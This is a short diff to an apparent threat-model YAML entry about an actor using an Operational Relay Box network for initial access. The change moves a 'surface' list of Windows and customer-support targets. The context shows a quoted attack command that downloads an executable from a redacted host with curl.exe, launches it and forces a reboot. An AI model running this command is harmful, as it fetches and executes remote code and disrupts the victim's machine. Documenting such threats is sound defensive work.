@@ -28,6 +28,10 @@ threat:
     Example: A threat actor is using Operational Relay Box (ORB)
     network to gain an initial foothold and access to the victim's
     environment ref [1].
+  surface:
+    - Windows
+    - Customer Support
+    - Windows::Desktop
   severity: Moderate incident
   leverage: Infrastructure Compromise; Elevation of privilege; Information Disclosure; Tampering
   impact: Impairement; Business disruption; Lose Capabilities
@@ -129,7 +133,3 @@ threat:
      sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
      
      ```
-  surface:
-    - Windows
-    - Customer Support
-    - Windows::Desktop
